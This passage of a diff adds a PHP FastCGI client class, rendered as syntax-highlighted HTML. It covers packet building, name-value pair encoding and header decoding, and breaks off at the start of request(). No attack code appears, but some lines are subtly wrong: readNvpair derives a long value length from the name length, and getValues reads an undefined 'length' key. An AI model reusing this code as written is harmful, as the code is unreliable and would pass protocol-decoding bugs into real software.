+    <span class="token keyword">const</span> <span class="token constant">MPXS_CONNS</span>           <span class="token operator">=</span> <span class="token string single-quoted-string">'MPXS_CONNS'</span><span class="token punctuation">;</span>
+    <span class="token keyword">const</span> <span class="token constant">HEADER_LEN</span>           <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span>
+    <span class="token comment">/**
+     * Socket
+     * @var Resource
+     */</span>
+    <span class="token keyword">private</span> <span class="token variable">$_sock</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>
+    <span class="token comment">/**
+     * Host
+     * @var String
+     */</span>
+    <span class="token keyword">private</span> <span class="token variable">$_host</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>
+    <span class="token comment">/**
+     * Port
+     * @var Integer
+     */</span>
+    <span class="token keyword">private</span> <span class="token variable">$_port</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>
+    <span class="token comment">/**
+     * Keep Alive
+     * @var Boolean
+     */</span>
+    <span class="token keyword">private</span> <span class="token variable">$_keepAlive</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
+    <span class="token comment">/**
+     * Constructor
+     *
+     * @param String $host Host of the FastCGI application
+     * @param Integer $port Port of the FastCGI application
+     */</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">,</span> <span class="token variable">$port</span> <span class="token operator">=</span> <span class="token number">9001</span><span class="token punctuation">)</span> <span class="token comment">// and default value for port, just for unixdomain socket</span>
+    <span class="token punctuation">{</span>
+        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">_host</span> <span class="token operator">=</span> <span class="token variable">$host</span><span class="token punctuation">;</span>
+        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">_port</span> <span class="token operator">=</span> <span class="token variable">$port</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    <span class="token comment">/**
+     * Define whether or not the FastCGI application should keep the connection
+     * alive at the end of a request
+     *
+     * @param Boolean $b true if the connection should stay alive, false otherwise
+     */</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">setKeepAlive</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">_keepAlive</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">boolean</span><span class="token punctuation">)</span><span class="token variable">$b</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">_keepAlive</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">_sock</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">_sock</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+    <span class="token comment">/**
+     * Get the keep alive status
+     *
+     * @return Boolean true if the connection should stay alive, false otherwise
+     */</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">getKeepAlive</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">_keepAlive</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    <span class="token comment">/**
+     * Create a connection to the FastCGI application
+     */</span>
+    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">connect</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">_sock</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token comment">//$this-&gt;_sock = fsockopen($this-&gt;_host, $this-&gt;_port, $errno, $errstr, 5);</span>
+            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">_sock</span> <span class="token operator">=</span> <span class="token function">stream_socket_client</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">_host</span><span class="token punctuation">,</span> <span class="token variable">$errno</span><span class="token punctuation">,</span> <span class="token variable">$errstr</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">_sock</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Unable to connect to FastCGI application'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+    <span class="token comment">/**
+     * Build a FastCGI packet
+     *
+     * @param Integer $type Type of the packet
+     * @param String $content Content of the packet
+     * @param Integer $requestId RequestId
+     */</span>
+    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">buildPacket</span><span class="token punctuation">(</span><span class="token variable">$type</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">,</span> <span class="token variable">$requestId</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token variable">$clen</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">return</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">VERSION_1</span><span class="token punctuation">)</span>         <span class="token comment">/* version */</span>
+            <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$type</span><span class="token punctuation">)</span>                    <span class="token comment">/* type */</span>
+            <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$requestId</span> <span class="token operator">&gt;&gt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> <span class="token comment">/* requestIdB1 */</span>
+            <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$requestId</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span>        <span class="token comment">/* requestIdB0 */</span>
+            <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$clen</span> <span class="token operator">&gt;&gt;</span> <span class="token number">8</span> <span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span>     <span class="token comment">/* contentLengthB1 */</span>
+            <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$clen</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span>             <span class="token comment">/* contentLengthB0 */</span>
+            <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>                        <span class="token comment">/* paddingLength */</span>
+            <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>                        <span class="token comment">/* reserved */</span>
+            <span class="token operator">.</span> <span class="token variable">$content</span><span class="token punctuation">;</span>                     <span class="token comment">/* content */</span>
+    <span class="token punctuation">}</span>
+    <span class="token comment">/**
+     * Build an FastCGI Name value pair
+     *
+     * @param String $name Name
+     * @param String $value Value
+     * @return String FastCGI Name value pair
+     */</span>
+    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">buildNvpair</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token variable">$nlen</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token variable">$vlen</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$nlen</span> <span class="token operator">&lt;</span> <span class="token number">128</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token comment">/* nameLengthB0 */</span>
+            <span class="token variable">$nvpair</span> <span class="token operator">=</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$nlen</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+            <span class="token comment">/* nameLengthB3 &amp; nameLengthB2 &amp; nameLengthB1 &amp; nameLengthB0 */</span>
+            <span class="token variable">$nvpair</span> <span class="token operator">=</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$nlen</span> <span class="token operator">&gt;&gt;</span> <span class="token number">24</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">0x80</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$nlen</span> <span class="token operator">&gt;&gt;</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$nlen</span> <span class="token operator">&gt;&gt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$nlen</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$vlen</span> <span class="token operator">&lt;</span> <span class="token number">128</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token comment">/* valueLengthB0 */</span>
+            <span class="token variable">$nvpair</span> <span class="token operator">.=</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$vlen</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+            <span class="token comment">/* valueLengthB3 &amp; valueLengthB2 &amp; valueLengthB1 &amp; valueLengthB0 */</span>
+            <span class="token variable">$nvpair</span> <span class="token operator">.=</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$vlen</span> <span class="token operator">&gt;&gt;</span> <span class="token number">24</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">0x80</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$vlen</span> <span class="token operator">&gt;&gt;</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$vlen</span> <span class="token operator">&gt;&gt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$vlen</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+        <span class="token comment">/* nameData &amp; valueData */</span>
+        <span class="token keyword">return</span> <span class="token variable">$nvpair</span> <span class="token operator">.</span> <span class="token variable">$name</span> <span class="token operator">.</span> <span class="token variable">$value</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    <span class="token comment">/**
+     * Read a set of FastCGI Name value pairs
+     *
+     * @param String $data Data containing the set of FastCGI NVPair
+     * @return array of NVPair
+     */</span>
+    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">readNvpair</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token variable">$length</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token variable">$array</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$length</span> <span class="token operator">===</span> <span class="token constant">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token variable">$length</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+        <span class="token variable">$p</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token variable">$p</span> <span class="token operator">!=</span> <span class="token variable">$length</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token variable">$nlen</span> <span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">{</span><span class="token variable">$p</span><span class="token operator">++</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$nlen</span> <span class="token operator">&gt;=</span> <span class="token number">128</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                <span class="token variable">$nlen</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token variable">$nlen</span> <span class="token operator">&amp;</span> <span class="token number">0x7F</span> <span class="token operator">&lt;&lt;</span> <span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token variable">$nlen</span> <span class="token operator">|=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">{</span><span class="token variable">$p</span><span class="token operator">++</span><span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token variable">$nlen</span> <span class="token operator">|=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">{</span><span class="token variable">$p</span><span class="token operator">++</span><span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token variable">$nlen</span> <span class="token operator">|=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">{</span><span class="token variable">$p</span><span class="token operator">++</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span>
+            <span class="token variable">$vlen</span> <span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">{</span><span class="token variable">$p</span><span class="token operator">++</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$vlen</span> <span class="token operator">&gt;=</span> <span class="token number">128</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                <span class="token variable">$vlen</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token variable">$nlen</span> <span class="token operator">&amp;</span> <span class="token number">0x7F</span> <span class="token operator">&lt;&lt;</span> <span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token variable">$vlen</span> <span class="token operator">|=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">{</span><span class="token variable">$p</span><span class="token operator">++</span><span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token variable">$vlen</span> <span class="token operator">|=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">{</span><span class="token variable">$p</span><span class="token operator">++</span><span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token variable">$vlen</span> <span class="token operator">|=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">{</span><span class="token variable">$p</span><span class="token operator">++</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span>
+            <span class="token variable">$array</span><span class="token punctuation">[</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token variable">$p</span><span class="token punctuation">,</span> <span class="token variable">$nlen</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token variable">$p</span><span class="token operator">+</span><span class="token variable">$nlen</span><span class="token punctuation">,</span> <span class="token variable">$vlen</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token variable">$p</span> <span class="token operator">+=</span> <span class="token punctuation">(</span><span class="token variable">$nlen</span> <span class="token operator">+</span> <span class="token variable">$vlen</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+        <span class="token keyword">return</span> <span class="token variable">$array</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    <span class="token comment">/**
+     * Decode a FastCGI Packet
+     *
+     * @param String $data String containing all the packet
+     * @return array
+     */</span>
+    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">decodePacketHeader</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token variable">$ret</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'version'</span><span class="token punctuation">]</span>       <span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'type'</span><span class="token punctuation">]</span>          <span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'requestId'</span><span class="token punctuation">]</span>     <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">{</span><span class="token number">2</span><span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">{</span><span class="token number">3</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'contentLength'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">{</span><span class="token number">4</span><span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">{</span><span class="token number">5</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'paddingLength'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">{</span><span class="token number">6</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'reserved'</span><span class="token punctuation">]</span>      <span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">{</span><span class="token number">7</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">return</span> <span class="token variable">$ret</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    <span class="token comment">/**
+     * Read a FastCGI Packet
+     *
+     * @return array
+     */</span>
+    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">readPacket</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$packet</span> <span class="token operator">=</span> <span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">_sock</span><span class="token punctuation">,</span> <span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">HEADER_LEN</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token variable">$resp</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">decodePacketHeader</span><span class="token punctuation">(</span><span class="token variable">$packet</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'contentLength'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                <span class="token variable">$len</span>  <span class="token operator">=</span> <span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'contentLength'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+                <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token variable">$len</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$buf</span><span class="token operator">=</span><span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">_sock</span><span class="token punctuation">,</span> <span class="token variable">$len</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                    <span class="token variable">$len</span> <span class="token operator">-=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$buf</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                    <span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span> <span class="token operator">.=</span> <span class="token variable">$buf</span><span class="token punctuation">;</span>
+                <span class="token punctuation">}</span>
+            <span class="token punctuation">}</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'paddingLength'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                <span class="token variable">$buf</span><span class="token operator">=</span><span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">_sock</span><span class="token punctuation">,</span> <span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'paddingLength'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span>
+            <span class="token keyword">return</span> <span class="token variable">$resp</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+            <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+    <span class="token comment">/**
+     * Get Informations on the FastCGI application
+     *
+     * @param array $requestedInfo information to retrieve
+     * @return array
+     */</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">getValues</span><span class="token punctuation">(</span><span class="token keyword type-hint">array</span> <span class="token variable">$requestedInfo</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">connect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token variable">$request</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>
+        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$requestedInfo</span> <span class="token keyword">as</span> <span class="token variable">$info</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token variable">$request</span> <span class="token operator">.=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">buildNvpair</span><span class="token punctuation">(</span><span class="token variable">$info</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+        <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">_sock</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">buildPacket</span><span class="token punctuation">(</span><span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">GET_VALUES</span><span class="token punctuation">,</span> <span class="token variable">$request</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token variable">$resp</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">readPacket</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'type'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">GET_VALUES_RESULT</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">readNvpair</span><span class="token punctuation">(</span><span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'length'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Unexpected response type, expecting GET_VALUES_RESULT'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+    <span class="token comment">/**
+     * Execute a request to the FastCGI application
+     *
+     * @param array $params Array of parameters
+     * @param String $stdin Content
+     * @return String
+     */</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">request</span><span class="token punctuation">(</span><span class="token keyword type-hint">array</span> <span class="token variable">$params</span><span class="token punctuation">,</span> <span class="token variable">$stdin</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token variable">$response</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>
+<span class="token comment">//        $this-&gt;connect();</span>
